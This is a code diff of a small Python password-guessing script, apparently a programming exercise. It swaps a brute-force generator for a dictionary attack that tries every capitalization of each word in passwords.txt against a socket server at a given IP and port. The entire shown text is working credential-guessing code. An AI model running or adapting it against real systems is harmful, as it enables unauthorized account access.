@@ -29,11 +29,22 @@ class Hacker:
         self.socket.close()
 
 
-def password_generator():
-    pass_chars = string.ascii_lowercase + string.digits
-    for pass_len in range(1, len(pass_chars) + 1):
-        for comb in itertools.product(pass_chars, repeat=pass_len):
-            yield "".join(comb)
+def password_list_generator():
+    passwords = []
+    with open("passwords.txt", 'r') as file:
+        for line in file:
+            passwords.append(line.rstrip())
+    return passwords
+
+
+def capitalizations(s):
+    if s == '':
+        yield ''
+        return
+    for rest in capitalizations(s[1:]):
+        yield s[0].upper() + rest
+        if s[0].upper() != s[0].lower():
+            yield s[0].lower() + rest
 
 
 if __name__ == "__main__":
@@ -55,9 +66,13 @@ if __name__ == "__main__":
     hacky = Hacker()
     hacky.connect(args.ip_address, int(args.socket))
 
-    for password in password_generator():
-        hacky.send_message(password)
-        response = hacky.receive_response()
-        if response == "Connection success!":
-            print(password)
-            break
+    for password in password_list_generator():
+        for combination in capitalizations(password):
+            try:
+                hacky.send_message(combination)
+                response = hacky.receive_response()
+                if response == "Connection success!":
+                    print(combination)
+                    break
+            except ConnectionAbortedError:
+                break
